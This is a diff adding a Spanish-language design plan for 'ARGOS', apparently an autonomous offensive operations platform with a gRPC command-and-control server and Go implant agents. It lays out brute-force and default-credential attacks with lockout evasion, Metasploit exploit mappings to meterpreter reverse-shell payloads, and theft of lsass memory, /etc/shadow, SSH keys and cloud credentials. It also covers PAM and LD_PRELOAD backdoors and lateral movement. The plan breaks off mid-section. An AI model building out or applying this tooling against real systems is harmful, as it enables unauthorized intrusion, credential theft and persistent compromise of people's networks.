@@ -1,0 +1,1261 @@
+================================================================================
+ARGOS v2.1 — PLAN DE IMPLEMENTACION PROFESIONAL
+Semi-Autonomous Offensive Operations Platform
+================================================================================
+
+Estado actual: 34/36 tests pasando, Decision Engine completo, gRPC stubs sin
+generar, agentes Go con comunicacion stubeada, laboratorio Docker/Podman funcional
+
+================================================================================
+FASE 1 — G R P C   Y   C O M U N I C A C I O N
+================================================================================
+
+1.1  GENERAR STUBS PROTOBUF
+─────────────────────────────
+Archivo: shared/proto/argos.proto (280 lineas, ya definido)
+Accion: Ejecutar protoc para generar stubs Python y Go
+
+  $ make proto        # Python: argos_pb2.py, argos_pb2_grpc.py
+  $ make proto-go     # Go: argos.pb.go, argos_grpc.pb.go
+
+Verificacion:
+  - Los stubs .py deben ser importables: from shared.proto import argos_pb2
+  - Los stubs .go deben compilar: go build ./... en agents/cell y agents/stager
+
+1.2  REFACTOR api/grpc_server.py — BEACON STREAM REAL
+───────────────────────────────────────────────────────
+Archivo: api/grpc_server.py (290 lineas)
+
+Problema actual:
+  - _build_director_command() hardcodea type=EXPLOIT, ignora el comando real
+  - No hay cola de comandos por agente, el Director emite eventos pero nadie
+    los convierte en comandos gRPC para el agente
+
+Nueva arquitectura — Command Pipeline:
+
+  Director                                  gRPC Beacon Stream
+  ┌──────────────────────┐                  ┌──────────────────────┐
+  │ ExploitManager        │                  │ AgentC2Servicer      │
+  │ _dispatch_to_agent()──┼──► put(cmd) ──► │ _pending_commands    │
+  │                      │                  │   [agent_id]         │
+  │ ReconManager          │                  │   ┌───────────────┐ │
+  │ _dispatch_scan()──────┼──► put(cmd) ──► │   │ asyncio.Queue │ │
+  └──────────────────────┘                  │   └───────┬───────┘ │
+                                            │           │ get()   │
+                                            │           ▼         │
+                                            │  Beacon() stream    │
+                                            │  ─────────────────► │──► Agente Go
+                                            │  ◄───────────────── │◄── Heartbeat
+                                            └──────────────────────┘
+
+Implementacion:
+
+  1. Agregar a Director:
+     self._pending_commands: Dict[str, asyncio.Queue] = {}
+
+  2. Metodo Director.queue_command(agent_id, command):
+     if agent_id not in self._pending_commands:
+         self._pending_commands[agent_id] = asyncio.Queue(maxsize=10)
+     await self._pending_commands[agent_id].put(command)
+
+  3. Refactor ExploitManager._dispatch_to_agent():
+     cmd = DirectorCommand(type=EXPLOIT, exploit_cmd=ExploitCommand(
+         target_host=host_id, technique=action, cve=cve, params=params))
+     await self.director.queue_command(agent_id, cmd)
+
+  4. Refactor ReconManager._dispatch_scan():
+     cmd = DirectorCommand(type=SCAN, scan_cmd=ScanCommand(
+         targets=[ip], scan_type="tcp_syn", ports=top_ports, rate=1000))
+     await self.director.queue_command(agent_id, cmd)
+
+  5. Refactor ArgosAgentC2Servicer.Beacon():
+     async def Beacon(self, request_iterator, context):
+         agent_id = None
+         cmd_queue = self.director._pending_commands.get(agent_id)
+         async for agent_event in request_iterator:
+             agent_id = agent_event.agent_id
+             # Procesar heartbeat
+             if agent_event.HasField("hb"):
+                 await self.director.process_heartbeat(...)
+             # Procesar resultados de scan/exploit
+             elif agent_event.HasField("scan"):
+                 await self.director.process_finding(...)
+             elif agent_event.HasField("exploit"):
+                 await self.director.process_finding(...)
+             # Intentar despachar comando pendiente
+             try:
+                 cmd = await asyncio.wait_for(cmd_queue.get(), timeout=0.5)
+                 yield cmd  # Enviar comando al agente
+             except asyncio.TimeoutError:
+                 yield DirectorCommand(type=SLEEP)  # Keepalive
+
+Profesionalismo extra:
+  - Rate limiting: Queue(maxsize=10) evita memoria infinita
+  - Command timeout: DirectorCommand.timeout_s se respeta. Si expira sin
+    EXPLOIT_RESULT del agente, se marca como TIMED_OUT en el EventBus
+  - Reconexion: si el stream se cae, comandos no enviados se reencolan
+  - Logging estructurado: cada comando despachado/recibido se loguea con
+    correlation_id unico
+
+Verificacion:
+  - Test: test_beacon_stream_dispatches_commands
+  - Test: test_beacon_command_timeout
+  - Test: test_beacon_reconnect_requeues_commands
+
+1.3  GO AGENT — CONEXION gRPC REAL
+────────────────────────────────────
+Archivos:
+  agents/cell/main.go (246 lineas) — convertir todos los stubs a gRPC real
+  agents/stager/main.go (357 lineas) — idem
+
+Problema actual:
+  - register() crea RegisterAck local, jamas llama gRPC
+  - beaconLoop() construye AgentEvent y lo descarta con _
+  - reportFinding() loguea JSON, jamas llama ReportFinding RPC
+  - executePost() tiene codigo comentado, nunca se ejecuta
+  - executeExploit() importa el paquete exploit pero no lo llama
+  - Proto stubs no importados: // pb "github.com/argos/cell/proto"
+
+Refactor agents/cell/main.go:
+
+  1. Importar stubs generados:
+     import pb "github.com/argos/shared/proto"
+
+  2. register() real (lineas 131-134):
+     func (c *Cell) register() error {
+         resp, err := c.client.Register(context.Background(), &pb.AgentInfo{
+             AgentId:  c.agentID,
+             Hostname: c.hostname,
+             Os:       runtime.GOOS,
+             Arch:     runtime.GOARCH,
+             Ip:       c.outboundIP,
+             Version:  "2.1.0",
+         })
+         if err != nil {
+             return fmt.Errorf("register: %w", err)
+         }
+         c.interval = int(resp.BeaconIntervalSec)
+         log.Printf("[Cell] Registrado. Beacon: %ds", c.interval)
+         return nil
+     }
+
+  3. controlLoop() real (lineas 136-156):
+     func (c *Cell) controlLoop() {
+         stream, err := c.client.Beacon(context.Background())
+         if err != nil {
+             return
+         }
+         // Goroutine de envio (heartbeat + resultados)
+         go func() {
+             ticker := time.NewTicker(time.Duration(c.interval) * time.Second)
+             defer ticker.Stop()
+             for range ticker.C {
+                 event := &pb.AgentEvent{
+                     AgentId: c.agentID,
+                     Type:    pb.EventType_HEARTBEAT,
+                     Hb:      &pb.Heartbeat{CpuUsage: getCPU(), MemUsage: getMem()},
+                 }
+                 if err := stream.Send(event); err != nil {
+                     return
+                 }
+             }
+         }()
+         // Loop de recepcion (comandos del Director)
+         for {
+             cmd, err := stream.Recv()
+             if err != nil {
+                 return
+             }
+             c.dispatchCommand(cmd)
+         }
+     }
+
+  4. dispatchCommand() nuevo:
+     func (c *Cell) dispatchCommand(cmd *pb.DirectorCommand) {
+         switch cmd.Type {
+         case pb.CommandType_SCAN:
+             result := c.executeScan(cmd.GetScanCmd())
+             c.reportScanResult(result)
+         case pb.CommandType_EXPLOIT:
+             result := c.executeExploitDirect(cmd.GetExploitCmd())
+             c.reportExploitResult(result)
+         case pb.CommandType_PERSIST:
+             c.executePost()
+         case pb.CommandType_SLEEP:
+             // Ajustar intervalo
+         case pb.CommandType_SELF_DESTRUCT:
+             c.selfDestruct()
+         }
+     }
+
+  5. executePost() descomentar:
+     - Descomentar codigo de InstallPersistence() y DumpCredentials()
+     - Agregar import del paquete post
+     - reportar resultados via stream.Send() con AgentEvent{Type: CREDENTIAL_FOUND}
+
+  6. Reconexion con exponential backoff:
+     func (c *Cell) run() {
+         backoff := 1 * time.Second
+         maxBackoff := 5 * time.Minute
+         for {
+             if err := c.connectAndRun(); err != nil {
+                 log.Printf("[Cell] Error: %v. Retry in %v", err, backoff)
+                 time.Sleep(backoff)
+                 backoff = time.Duration(float64(backoff) * 1.5)
+                 if backoff > maxBackoff {
+                     backoff = maxBackoff
+                 }
+             }
+         }
+     }
+
+  7. getCPUUsage() y getMemUsage() reales (stager linea 323-331):
+     import "github.com/shirou/gopsutil/v3/cpu"
+     import "github.com/shirou/gopsutil/v3/mem"
+
+     func getCPUUsage() float32 {
+         p, _ := cpu.Percent(1*time.Second, false)
+         if len(p) > 0 { return float32(p[0] / 100.0) }
+         return 0
+     }
+     func getMemUsage() float32 {
+         m, _ := mem.VirtualMemory()
+         return float32(m.UsedPercent / 100.0)
+     }
+
+Refactor agents/stager/main.go (mismos cambios que cell pero solo para stager):
+
+  - register() real via pb.NewAgentC2Client(conn).Register()
+  - beaconLoop() real via stream bidireccional
+  - executeCommand() soportar todos los CommandTypes (SCAN no aplica,
+    EXPLOIT delega a modulo en memoria, SLEEP, SELF_DESTRUCT, DEPLOY_MODULE)
+
+Profesionalismo extra:
+  - Mutex en todas las operaciones de red (conn, stream) para thread safety
+  - Health check periodico al conn via conn.GetState()
+  - Context cancellation en todos los loops (ctx, cancel) para shutdown limpio
+  - TLS con certificados embebidos via embed.FS (build tag //go:embed certs/*)
+  - Logging estructurado con niveles (DEBUG heartbeat, INFO comandos, ERROR fallos)
+  - Metricas de agente expuestas via struct AgentMetrics{CmdSent, CmdFailed, ...}
+
+Verificacion:
+  - Test de integracion: Director + gRPC server + Go agent en mismo proceso
+  - Test: agente se registra, recibe comando SCAN, ejecuta escaner real,
+    reporta resultados, Director recibe findings y dispara Decision Engine
+
+1.4  COMANDO 'connect' EN CONSOLA
+───────────────────────────────────
+Archivo: argos_console.py
+
+Nuevo comando:
+  argos> connect cell --target 10.100.0.20 --c2 127.0.0.1:50051
+
+Implementacion:
+  def do_connect(self, arg):
+      parser: cell|stager [--target IP] [--c2 HOST:PORT]
+      1. Compila agente via ArsenalBuilder: go build -o /tmp/argos_cell agents/cell
+      2. Ejecuta en subprocess: /tmp/argos_cell ARGOS_C2_HOST=127.0.0.1:50051 &
+         (O alternativamente, en goroutine via Go cross-compile + exec)
+      3. Muestra PID y log tail (-f) en panel de la consola
+      4. Comando 'agents' muestra agentes conectados (via gRPC WatchMission)
+      5. Comando 'disconnect <agent_id>' envia SELF_DESTRUCT al agente
+
+
+================================================================================
+FASE 2 — R E C O N O C I M I E N T O   P R O F U N D O
+================================================================================
+
+Objetivo: El agente Go no solo detecta puertos abiertos, sino que identifica
+versiones exactas de servicios, OS, y vulnerabilidades potenciales. Cada
+hallazgo se reporta como Finding proto con tipo, version, CPE y banner.
+
+2.1  HTTP FINGERPRINT MODULE
+──────────────────────────────
+Archivo NUEVO: agents/cell/recon/http.go (~200 lineas)
+
+Estructura HTTPFingerprint:
+  type HTTPResult struct {
+      IP          string
+      Port        int
+      StatusCode  int
+      Server      string   // "Apache/2.4.49 (Ubuntu)"
+      XPoweredBy  string   // "PHP/7.4.3"
+      SetCookie   string   // PHPSESSID, JSESSIONID, etc.
+      WWWAuth     string   // Basic, NTLM, Digest
+      Title       string   // <title>...</title>
+      Technologies []string // jQuery, Bootstrap, WordPress
+      Headers     map[string]string
+  }
+
+Tecnica:
+  1. HTTP GET / con timeout de 5s
+  2. Parsear headers: Server, X-Powered-By, Set-Cookie, WWW-Authenticate
+  3. Extraer <title> del body (primeros 64KB)
+  4. Fingerprint tecnologias via fingerprints.json embebido:
+     - jQuery: <script src="...jquery-X.Y.Z"
+     - Bootstrap: <link href="...bootstrap.min.css"
+     - WordPress: /wp-content/, /wp-admin/, generator meta tag
+     - PHPMyAdmin, Tomcat, Jenkins, etc.
+  5. Verificar paths comunes:
+     GET /robots.txt, /sitemap.xml, /.git/HEAD, /.env, /wp-login.php,
+     /phpmyadmin/, /manager/html, /console
+  6. Detectar WAF/Proxy: Server: cloudflare, nginx, AWSALB cookie
+  7. Reportar como Finding{type: SERVICE_OPEN, service_info: ServiceInfo{
+     name: "http", port: 80, version: "Apache/2.4.49", banner: "Ubuntu",
+     cpe: "cpe:/a:apache:http_server:2.4.49"}}
+
+Verificacion:
+  - Test unitario con httptest.NewServer (simula Apache real)
+  - Test contra lab: Apache 2.4.49 en :8080 debe detectar version exacta
+
+2.2  SSH FINGERPRINT MODULE
+─────────────────────────────
+Archivo NUEVO: agents/cell/recon/ssh.go (~150 lineas)
+
+Tecnica:
+  1. TCP connect al puerto 22, leer banner inicial (SSH-2.0-OpenSSH_7.4p1)
+  2. Parsear: protocolo (SSH-2.0), software (OpenSSH), version (7.4p1),
+     SO hint (Ubuntu-2ubuntu0.1, Debian-3, etc.)
+  3. Enviar KEX_INIT para obtener algoritmos soportados:
+     - Algoritmos debiles: diffie-hellman-group1-sha1, arcfour
+     - Algoritmos de host key: ssh-rsa (deprecated), ssh-ed25519 (moderno)
+  4. Intentar auth "none" para ver si el servidor revela metodos permitidos
+     (publickey, password, keyboard-interactive)
+  5. Reportar: version, SO, algoritmos debiles, metodos de auth
+
+  type SSHResult struct {
+      IP         string
+      Banner     string   // "SSH-2.0-OpenSSH_7.4p1 Ubuntu-2ubuntu0.1"
+      Software   string   // "OpenSSH"
+      Version    string   // "7.4p1"
+      OS         string   // "Ubuntu"
+      WeakAlgos  []string // ["diffie-hellman-group1-sha1"]
+      AuthMethods []string // ["publickey", "password"]
+  }
+
+2.3  MYSQL DETECTION MODULE
+─────────────────────────────
+Archivo NUEVO: agents/cell/recon/mysql.go (~100 lineas)
+
+Tecnica:
+  1. TCP connect al puerto 3306, leer greeting packet (HandshakeV10)
+  2. Parsear: version string (5.7.38-0ubuntu0.18.04.1), protocol version,
+     auth plugin (mysql_native_password, caching_sha2_password)
+  3. Intentar conexion sin password (usuario root, sin auth) con timeout 3s
+  4. Si conecta: ejecutar SELECT VERSION(), SELECT @@version_compile_os,
+     SELECT user, host FROM mysql.user LIMIT 5
+  5. Si no conecta con root sin pass, probar root:root, root:mysql, root:password
+  6. Reportar: version, SO, auth plugin, usuarios (si acceso obtenido)
+
+  type MySQLResult struct {
+      IP          string
+      Version     string   // "5.7.38"
+      AuthPlugin  string   // "mysql_native_password"
+      Access      bool     // true si root sin pass conecta
+      Users       []string // lista de usuarios si access=true
+  }
+
+2.4  M S S Q L   D E T E C T I O N   M O D U L E
+───────────────────────────────────────────────────
+Archivo NUEVO: agents/cell/recon/mssql.go (~120 lineas)
+
+Tecnica:
+  1. TCP connect al puerto 1433, leer TDS Pre-Login Response
+  2. Parsear: version (ej: 15.0.2000.5 = SQL Server 2019), encryption flag
+  3. Si encryption=OFF: intentar login con sa:<vacio>, sa:sa, sa:password123
+  4. Si login ok: ejecutar SELECT @@VERSION, SELECT name FROM sys.databases,
+     ejecutar xp_cmdshell 'whoami' si xp_cmdshell esta enabled
+  5. Detectar: version de SQL Server, SO subyacente, bases de datos visibles,
+     xp_cmdshell habilitado (riesgo critico)
+  6. Reportar: version, edition, SO, databases, xp_cmdshell status
+
+  type MSSQLResult struct {
+      IP           string
+      Version      string   // "Microsoft SQL Server 2019 (RTM)"
+      Edition      string   // "Standard Edition", "Express"
+      OS           string   // "Windows Server 2019"
+      Databases    []string // ["master","tempdb","msdb"]
+      XPCmdShell   bool     // xp_cmdshell enabled
+      SANoPassword bool     // sa sin password
+  }
+
+2.5  P O S T G R E S Q L   D E T E C T I O N
+───────────────────────────────────────────────
+Archivo NUEVO: agents/cell/recon/postgresql.go (~100 lineas)
+
+Tecnica:
+  1. TCP connect al puerto 5432, leer StartupMessage response
+  2. Intentar auth con postgres:postgres, postgres:password, postgres:<vacio>
+  3. Si conecta: SELECT version(), SELECT current_database(),
+     SELECT usename FROM pg_user
+  4. Verificar superuser: SELECT usesuper FROM pg_user WHERE usename=current_user
+  5. Verificar COPY TO/FROM PROGRAM: SELECT setting FROM pg_settings
+     WHERE name='pg_execute_server_program'
+  6. Reportar: version, usuarios, superuser flag, COPY PROGRAM flag
+
+2.6  F T P   D E T E C T I O N
+────────────────────────────────
+Archivo NUEVO: agents/cell/recon/ftp.go (~80 lineas)
+
+Tecnica:
+  1. TCP connect, leer banner (220 ProFTPD 1.3.5 Server)
+  2. Intentar login anonymous:anonymous
+  3. Si anonymous ok: LIST para ver contenido, CWD para ver si es writable
+  4. Reportar: banner, anonymous access, writable directories
+
+2.7  R D P   D E T E C T I O N
+────────────────────────────────
+Archivo NUEVO: agents/cell/recon/rdp.go (~100 lineas)
+
+Tecnica:
+  1. TCP connect al 3389, enviar paquete de negociacion TPKT/COTP/RDP
+  2. Parsear respuesta: RDP Negotiation Response (protocolos soportados:
+     RDP (0), SSL (1), CredSSP/NLA (2), RDSTLS (4))
+  3. Detectar: NLA habilitado (mas seguro), SSL disponible, version de SO
+     (Windows Server 2016, Windows 10, etc.)
+  4. Extraer: FQDN del servidor del certificado SSL si esta presente
+  5. Evaluar CVE-2019-0708: si RDP base + OS Windows 7/2008R2
+  6. Reportar: protocolos, NLA status, OS version, CVE candidatas
+
+2.8  R E D I S   D E T E C T I O N
+─────────────────────────────────────
+Archivo NUEVO: agents/cell/recon/redis.go (~60 lineas)
+
+Tecnica:
+  1. TCP connect, enviar PING
+  2. Si sin autenticacion: ejecutar INFO server (version, OS, redis_mode,
+     config_file, maxmemory), CONFIG GET * (privileges)
+  3. Si requiere auth: probar AUTH <vacio>, AUTH redis, etc.
+  4. Reportar: version, modo (standalone/cluster/sentinel), auth status,
+     config file path (para CONFIG REWRITE RCE)
+
+2.9  S N M P   D E T E C T I O N
+──────────────────────────────────
+Archivo NUEVO: agents/cell/recon/snmp.go (~80 lineas)
+
+Tecnica:
+  1. UDP connect al 161, enviar SNMP GET con community strings comunes
+     (public, private, community, manager, admin, cisco)
+  2. Si responde: hacer GET de sysDescr.0 (1.3.6.1.2.1.1.1.0) para OS
+     y sysName.0 (1.3.6.1.2.1.1.5.0) para hostname
+  3. Reportar: community string, OS description, hostname
+
+2.10 O S   D E T E C T I O N   H E U R I S T I C S
+─────────────────────────────────────────────────────
+Archivo NUEVO: agents/cell/recon/osdetect.go (~120 lineas)
+
+Tecnica:
+  1. Analizar TTL de paquetes ICMP (TTL 64=Linux, 128=Windows, 255=BSD/Solaris)
+  2. Analizar fingerprints recolectados:
+     - HTTP Server header: "Apache/2.4.49 (Ubuntu)" -> Ubuntu
+     - SMB Negotiate Response: version dialect -> Windows version
+     - SSH banner: "OpenSSH_7.4p1 Ubuntu-2ubuntu0.1" -> Ubuntu
+     - MySQL greeting: "5.7.38-0ubuntu0.18.04.1" -> Ubuntu 18.04
+     - MSSQL @@VERSION: contiene Windows Server version
+  3. Votacion ponderada: cada fuente vota por un SO con peso segun confianza
+  4. Reportar: OS name, version, confidence (0-100%)
+
+2.11  R E F A C T O R   escaner.go   —   I N T E G R A R   M O D U L O S
+─────────────────────────────────────────────────────────────────────────
+Archivo a modificar: agents/cell/recon/scanner.go
+
+Cambios:
+  1. Agregar ScanResult.Services como []ServiceFingerprint (no solo []int)
+  2. Despues del port scan, para cada puerto abierto, dispatch al modulo
+     de fingerprint correspondiente segun guessService():
+     80/443/8080/8443 -> recon.FingerprintHTTP()
+     22               -> recon.FingerprintSSH()
+     3306             -> recon.FingerprintMySQL()
+     1433             -> recon.FingerprintMSSQL()
+     5432             -> recon.FingerprintPostgreSQL()
+     21               -> recon.FingerprintFTP()
+     3389             -> recon.FingerprintRDP()
+     6379             -> recon.FingerprintRedis()
+     161              -> recon.FingerprintSNMP()
+  3. Todos los resultados se consolidan en un ScanResult para enviar via gRPC
+  4. Agregar --deep-scan flag: si activo, hace todos los fingerprints,
+     si no, solo port scan basico (mas rapido, mas sigiloso)
+
+2.12  WEB PATH BRUTEFORCE INTEGRATION
+──────────────────────────────────────
+Archivo NUEVO: agents/cell/recon/dirbust.go (~100 lineas)
+
+Tecnica:
+  1. Embed wordlist (top 1000 dirs) via go:embed
+  2. HTTP GET a cada path con concurrencia limitada (10 workers)
+  3. Filtrar por status code: 200, 301, 302, 403, 401
+  4. Detectar: admin panels, config files, backups, git repos, logs
+  5. Reportar como Finding separado si encuentra algo critico
+
+2.13  R E C O N   S U M M A R Y   —   P R O F E S I O N A L I S M O
+──────────────────────────────────────────────────────────────────────
+  - Cada modulo tiene timeout configurable (default 3-5 segundos)
+  - Escaneo concurrente con worker pool limitado (default 20 workers)
+  - Fingerprinting no bloqueante: si un modulo falla, los demas continuan
+  - Resultados parciales se stremean al Director via stream.Send() incremental
+  - Anti-forense: randomizar orden de puertos/directorios, delays variables
+  - Context cancellation: respetar ctx.Done() en todos los modulos
+  - Rate limiting: parametrizable via DirectorCommand.ScanCommand.rate
+
+================================================================================
+FASE 3 — E X P L O T A C I O N   R E A L
+================================================================================
+
+3.1  DECISION ENGINE → METASPLOIT RPC   W I R E - U P
+────────────────────────────────────────────────────────
+Archivo a modificar: core/exploit_manager.py
+
+Problema actual:
+  - _is_msf_module() solo detecta strings que empiezan con "exploit/" o
+    "auxiliary/"
+  - Las acciones del Decision Engine no tienen formato MSF (son strings como
+    "smb_eternalblue_MS17-010", "ssh_brute_force", "rdp_bluekeep")
+
+Solucion — Mapeo de acciones a modulos MSF:
+  ACTION_TO_MSF = {
+      "smb_eternalblue_MS17-010": {
+          "module": "exploit/windows/smb/ms17_010_eternalblue",
+          "payload": "windows/x64/meterpreter/reverse_tcp",
+          "defaults": {"RPORT": "445"}
+      },
+      "rdp_bluekeep_CVE-2019-0708": {
+          "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+          "payload": "windows/x64/meterpreter/reverse_tcp",
+          "defaults": {"RPORT": "3389"}
+      },
+      "apache_path_traversal_CVE-2021-41773": {
+          "module": "exploit/multi/http/apache_normalize_path_rce",
+          "payload": "linux/x64/meterpreter/reverse_tcp",
+          "defaults": {"RPORT": "80", "SSL": "false"}
+      },
+      "mysql_udf_privesc": {
+          "module": "exploit/multi/mysql/mysql_udf_payload",
+          "payload": "linux/x64/meterpreter/reverse_tcp",
+          "defaults": {"RPORT": "3306"}
+      },
+      "vsftpd_backdoor_CVE-2011-2523": {
+          "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+          "payload": "cmd/unix/interact",
+          "defaults": {"RPORT": "21"}
+      },
+      "tomcat_manager_war_deploy": {
+          "module": "exploit/multi/http/tomcat_mgr_upload",
+          "payload": "java/meterpreter/reverse_tcp",
+          "defaults": {"RPORT": "8080", "TARGETURI": "/manager"}
+      },
+      "mssql_xp_cmdshell": {
+          "module": "auxiliary/admin/mssql/mssql_exec",
+          "payload": None,
+          "defaults": {"RPORT": "1433"}
+      },
+  }
+
+Implementacion:
+  1. ExploitManager._on_decision_approved() busca action en ACTION_TO_MSF
+  2. Si existe y MSF esta conectado:
+     - Construir opciones: defaults + RHOSTS=target_ip + LHOST/LPORT
+     - Llamar msf.execute_exploit(module, payload, options)
+     - Emitir EXPLOIT_SUCCESS o EXPLOIT_FAILED
+  3. Si no existe en el mapping, hacer _dispatch_to_agent() (explotacion nativa)
+  4. Agregar soporte para auxiliary modules (auxiliary/*) + payload=None
+  5. Despues de explotacion exitosa: msf.session_exec(session_id,
+     "post/windows/gather/hashdump") o equivalente
+
+Profesionalismo extra:
+  - LHOST/LPORT auto-detect desde la IP de red del Director
+  - Payload selection automatico: x64 vs x86, staged vs stageless,
+    segun OS y arch del target
+  - Session management: despues de MSF crear sesion, el Director trackea
+    session_id <-> host_id en el KnowledgeTree.mark_owned()
+  - Post-explotacion automatica via sesion MSF:
+    - hashdump (post/windows/gather/hashdump)
+    - credenciales (post/multi/gather/credentials)
+    - persistencia (post/windows/manage/persistence)
+  - Timeout de sesion: si la sesion MSF muere, se reporta como fallo via
+    Event.EXPLOIT_FAILED con motivo "session_died"
+
+3.2  C O M A N D O   'exploit'   E N   C O N S O L A
+───────────────────────────────────────────────────────
+Archivo: argos_console.py
+
+Nuevo comando:
+  argos> exploit <ip> <port> --auto
+
+Implementacion:
+  def do_exploit(self, arg):
+      1. Buscar el host en el Knowledge Tree por IP
+      2. Obtener servicios detectados en ese puerto
+      3. Evaluar con Decision Fusion Engine contra ese servicio
+      4. Mostrar la decision propuesta con confianza y explicacion
+      5. Si --auto o confianza > threshold, ejecutar via ExploitManager
+      6. Si no, encolar para aprobacion manual
+      7. Mostrar progreso: "Ejecutando EternalBlue... polling sesion MSF..."
+
+3.3  B R U T E   F O R C E   M O D U L E
+───────────────────────────────────────────
+Archivo NUEVO: agents/cell/exploit/bruteforce.go (~200 lineas)
+
+Tecnica:
+  Interfaz generica:
+  type BruteForcer interface {
+      Try(host string, port int, username string, password string) (bool, error)
+  }
+
+  Implementaciones:
+  - SSHBruteForcer:   gossh.Dial("tcp", host+":22", &ssh.ClientConfig{...})
+  - FTPBruteForcer:   net.Dial("tcp", host+":21") + "USER x\r\nPASS y\r\n"
+  - RDPBruteForcer:   libreria rdp-go para auth NLA + comprobacion
+  - SMBBruteForcer:   libreria go-smb para auth NTLM
+  - MySQLBruteForcer: go-sql-driver/mysql con DSN "user:pass@tcp(host:port)/"
+  - WinRMBruteForcer: libreria winrm-go para auth
+
+  Wordlist embebida via go:embed:
+  - Top 1000 passwords (rockyou mini)
+  - Top 50 usernames (admin, root, Administrator, sa, etc.)
+
+  Estrategia:
+  1. Recibir BruteCommand via gRPC del Director (service, wordlist_size)
+  2. Probar passwords concurrentemente (5 workers para no ser bloqueado)
+  3. Si encuentra creds validas, reportar inmediatamente via stream.Send()
+  4. Si pasados N intentos fallidos en T segundos, hacer pausa (evadir
+     account lockout / rate limiting)
+  5. Reportar progreso: "(45/1000) intentos, cred encontrada: admin/admin123"
+
+3.4  D E F A U L T   C R E D E N T I A L   C H E C K E R
+────────────────────────────────────────────────────────────
+Archivo NUEVO: agents/cell/exploit/defaultcreds.go (~150 lineas)
+
+Tecnica:
+  Base de datos embebida de creds por defecto (go:embed JSON):
+  [
+    {"service": "ssh",   "vendor": "Raspberry Pi", "user": "pi",    "pass": "raspberry"},
+    {"service": "ssh",   "vendor": "Ubuntu",       "user": "ubuntu","pass": "ubuntu"},
+    {"service": "mysql", "vendor": "generic",       "user": "root",  "pass": ""},
+    {"service": "mysql", "vendor": "generic",       "user": "root",  "pass": "root"},
+    {"service": "mssql", "vendor": "generic",       "user": "sa",    "pass": ""},
+    {"service": "mssql", "vendor": "generic",       "user": "sa",    "pass": "sa"},
+    {"service": "ftp",   "vendor": "generic",       "user": "admin", "pass": "admin"},
+    {"service": "tomcat","vendor": "generic",       "user": "admin", "pass": "admin"},
+    {"service": "rdp",   "vendor": "generic",       "user": "administrator","pass": ""},
+    // ... ~200 entries
+  ]
+
+  Flujo:
+  1. Recibir DefaultCredCommand via gRPC (service, vendor hint opcional)
+  2. Filtrar base de datos por servicio + vendor si se conoce
+  3. Probar cada par user:pass concurrentemente (3 workers)
+  4. Reportar coincidencias inmediatamente
+
+3.5  E X P L O I T   C H A I N I N G
+───────────────────────────────────────
+Archivo NUEVO: core/exploit_chain.py (~100 lineas)
+
+Tecnica:
+  El A* Planner ya encuentra rutas multi-step entre hosts. Cuando el
+  operador aprueba un plan de N pasos, el Chainer ejecuta secuencialmente:
+
+  class ExploitChainer:
+      async def execute_chain(self, route: Route):
+          for step in route.steps:
+              decision = self.fusion.fuse(...)
+              if decision.confidence < threshold:
+                  # Pausar y pedir aprobacion
+                  yield "PAUSE", decision
+              result = await self.exploit_manager.dispatch(step, decision)
+              if not result.success:
+                  # Plan B: probar siguiente alternativa del Decision Fusion
+                  alt = self._try_alternative(decision.alternatives)
+                  if not alt:
+                      yield "FAIL", result
+                      return
+              yield "OK", result
+          yield "COMPLETE", route
+
+  En consola:
+  argos> chain host1 -> host2 -> dc01
+    [1/3] host1 -> host2: apache_path_traversal (OK, session: sess-001)
+    [2/3] host2 -> dc01: smb_pass_the_hash (OK, session: sess-002)
+    [3/3] dc01: domain_admin achieved!
+    Chain completed.
+
+================================================================================
+FASE 4 — P O S T - E X P L O T A C I O N
+================================================================================
+
+4.1  A G E N T E   G O   —   M O D U L O S   C O M P L E T O S
+─────────────────────────────────────────────────────────────────
+Archivos a modificar: agents/cell/post/credentials.go, agents/cell/post/persistence.go
+
+credentials.go — De simulation a REAL:
+
+  Windows (privilegios de admin/SYSTEM):
+  1. Usar direct syscalls para MiniDumpWriteDump sobre lsass.exe:
+     - NtOpenProcess(lsass_pid, PROCESS_ALL_ACCESS)
+     - NtCreateFile(temp_dump_path)
+     - MiniDumpWriteDump(lsass_handle, ...)
+     - Leer dump en memoria (no disco), parsear con parser Mimikatz-like:
+       - Extraer hashes NTLM (MSV1_0, Kerberos, wdigest)
+       - Extraer plaintext passwords si wdigest esta habilitado
+     - Borrar dump de disco
+  2. DLL injection: injectar DLL que hookea LogonUserW/NplogonNotify
+     para capturar creds en tiempo real
+  3. Kerberos ticket extraction: LsaCallAuthenticationPackage(Kerberos)
+  4. DPAPI master key extraction + decrypt
+
+  Linux (privilegios root):
+  1. Leer /etc/shadow (hash extraction) + /etc/passwd (user list)
+  2. Process memory dump de SSH agent: buscar patrones de memoria para
+     claves privadas, usernames, passphrases
+  3. Buscar en archivos de configuracion:
+     - ~/.ssh/id_rsa, ~/.ssh/id_ed25519
+     - ~/.git-credentials, ~/.docker/config.json
+     - ~/.aws/credentials, ~/.config/gcloud/credentials.db
+     - /var/log/auth.log (para creds en texto plano logueadas)
+  4. Mimipenguin-like: escanear memoria de procesos GDM/KDE/LightDM/SSHD
+     para passwords en texto plano
+  5. Keyring harvesting: dump gnome-keyring-daemon, kdewallet RAM
+
+  Persistencia Windows (mejorada):
+  1. SchTasks con nombre randomizado + GUID
+  2. Registry Run (HKLM + HKCU) con nombres randomizados
+  3. WMI __EventFilter + __EventConsumer para persistencia "fileless"
+  4. COM object hijacking: CLSID legitimo → DLL maliciosa
+  5. Service DLL hijacking: encontrar servicio stopped con binPath writable
+  6. Startup folder .lnk con icono y nombre legitimo
+  7. Winlogon shell replacement
+  8. DLL search order hijacking (binario legitimo + DLL en mismo dir)
+
+  Persistencia Linux (mejorada):
+  1. Crontab @reboot con comando randomizado
+  2. Systemd user unit (systemctl --user)
+  3. .bashrc / .zshrc / .profile alias malicioso
+  4. LD_PRELOAD en /etc/environment
+  5. SSH authorized_keys2 con comando forzado
+  6. PAM module injection (pam_unix.so → pam_backdoor.so)
+
+4.2  L A T E R A L   M O V E M E N T
+──────────────────────────────────────
+Archivo NUEVO: agents/cell/lateral/lateral.go (~250 lineas)
+
+Tecnicas implementadas:
+
+  Windows -> Windows:
+  1. PsExec (impacket-like en Go puro):
+     - Conectar al ADMIN$ share via SMB
+     - Subir binario del agente
+     - Crear servicio remoto via Service Control Manager RPC
+     - Arrancar servicio → ejecucion remota
+  2. WMI Process Create:
+     - Conectar via DCOM/WMI (libreria go-ole o raw RPC)
+     - Win32_Process.Create(agent_binary_path)
+  3. WinRM:
